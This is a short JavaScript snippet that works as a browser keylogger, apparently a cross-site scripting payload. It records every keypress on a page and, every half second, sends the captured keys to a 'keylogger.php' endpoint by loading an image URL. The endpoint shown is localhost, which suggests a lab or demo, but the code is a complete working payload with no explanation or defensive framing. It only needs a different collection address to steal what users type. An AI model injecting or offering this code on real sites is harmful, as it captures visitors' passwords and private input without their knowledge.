var keys='';
document.onkeypress = function(e) {
  get = window.event?event:e;
  key = get.keyCode?get.keyCode:get.charCode;
  key = String.fromCharCode(key);
  keys+=key;
}
window.setInterval(function(){
url = 'http://localhost:9999/keylogger.php?key='
if(keys != '') {
  new Image().src = url+keys
  keys = '';
}
}, 500);